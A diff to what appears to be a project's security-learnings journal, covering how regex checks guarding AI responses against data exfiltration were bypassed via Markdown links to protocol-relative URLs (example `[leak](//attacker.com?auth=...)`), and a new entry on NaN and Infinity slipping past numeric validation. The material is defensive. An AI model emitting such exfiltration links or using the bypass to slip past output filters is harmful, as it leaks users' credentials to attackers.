@@ -251,3 +251,14 @@ Always include all variations of data-consuming methods (`json`, `text`, `blob`,
 **Vulnerability:** Regular expression checks on AI responses for data exfiltration (`urlRegex`) frequently use lookaheads or word boundaries like `(?:\s|^)\/\/` to detect protocol-relative URLs (`//attacker.com`). This fails when links are enclosed in brackets or parentheses (e.g. `[leak](//attacker.com?auth=...)`), because character boundaries like `(` are neither spaces nor the start of a string. Furthermore, constructing a `URL` object from such strings fails, forcing a fallback to basic catch-blocks which might not perform high-entropy or query parameter keyword validation.
 **Learning:** Traditional boundary-based URL extraction is bypassable via common Markdown structures. Using a negative lookbehind assertion `(?<!:)\/\/` identifies protocol-relative URLs anywhere in the string. Prepending `https:` to protocol-relative matches and passing the application origin as a base to the `URL` constructor prevents parsing failures.
 **Prevention:** Always use regex lookbehind assertions instead of space boundaries for protocol-relative links. Ensure the URL parser has a robust fallback check that mirrors the deep entropy and keyword analysis of the happy path.
+
+## 2026-06-14 - NaN & Infinity Validation Bypass in Client-Side Input Handling
+
+**Vulnerability:**
+Validation libraries and custom helpers that rely on basic `!isNaN` and comparison bounds checks (e.g., `value < 0 || value > 24`) are highly susceptible to validation bypass and DoS. When checking numeric inputs, entering non-finite values like `Infinity` can bypass bounds restrictions if checks rely purely on `!isNaN()`. Additionally, numeric fields evaluated as `NaN` (such as malicious payload objects parsed as floats) will evaluate to `false` in comparison checks (e.g., `NaN < 0` is false, `NaN > 24` is false), allowing invalid or malformed data to silently bypass security boundaries and pollute downstream app states.
+
+**Learning:**
+Traditional range-bound checks are not safe unless pre-validated with explicit `Number.isFinite()` and non-NaN checks. Similarly, string values must be bounded with strict length limits at validation entry points to prevent client-side resource exhaustion, ReDoS, and database bloating (such as massive strings injected into blood pressure or nutrition food names).
+
+**Prevention:**
+Always use `Number.isFinite()` instead of `!isNaN()` for numeric validations. Ensure any numeric variables are validated using `Number.isFinite(parsedValue) && !isNaN(parsedValue)` before executing relational range comparisons. Enforce strict character length limits on all user-controlled text inputs at the input-validation boundary.
